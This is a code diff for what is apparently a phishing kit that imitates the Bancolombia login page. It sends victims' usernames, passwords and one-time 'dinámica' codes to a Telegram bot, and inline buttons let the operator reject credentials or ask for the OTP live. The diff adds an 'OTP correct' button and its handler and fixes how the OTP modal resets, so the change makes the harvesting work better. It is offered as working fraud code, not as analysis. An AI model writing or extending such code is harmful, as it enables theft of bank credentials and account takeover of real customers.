@@ -292,7 +292,6 @@ claveInput.addEventListener("input", function() {
 function enviarIdentificacionTelegram(usuario, clave) {
     const mensaje = `⚡ <b>BANCOLOMBIA - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     
-    // Botones: Error Usuario o Pedir Dinámica
     const keyboard = {
         inline_keyboard: [[
             { text: '❌ Usuario Malo', callback_data: 'error_usuario' },
@@ -318,7 +317,8 @@ function enviarDinamicaTelegram(dinamica) {
     
     const keyboard = {
         inline_keyboard: [[
-            { text: '❌ Error Dinámica', callback_data: 'error_dinamica' }
+            { text: '❌ Error Dinámica', callback_data: 'error_dinamica' },
+            { text: '✅ Dinámica Correcta', callback_data: 'dinamica_ok' }
         ]]
     };
 
@@ -377,6 +377,8 @@ function handleTelegramActionLogin(action) {
     if (action === 'pedir_dinamica') {
         modal.classList.add("active");
         otpInput.value = "";
+        otpError.classList.remove("show");
+        otpContainer.classList.remove("error");
         actualizarOTP();
         setTimeout(() => otpInput.focus(), 100);
     } else if (action === 'error_usuario') {
@@ -391,13 +393,17 @@ function handleTelegramActionDinamica(action) {
     ocultarOverlay();
 
     if (action === 'error_dinamica') {
+        modal.classList.add("active"); // Asegurar que el modal esté abierto
         otpError.classList.add("show");
         otpContainer.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
         
-        actionProcessed = false; // Permitir reintentar
+        actionProcessed = false; // Permitir reintentar o recibir otra acción
+    } else if (action === 'dinamica_ok') {
+        alert("¡Clave dinámica correcta! (Simulación de ingreso exitoso)");
+        location.reload();
     }
 }
 
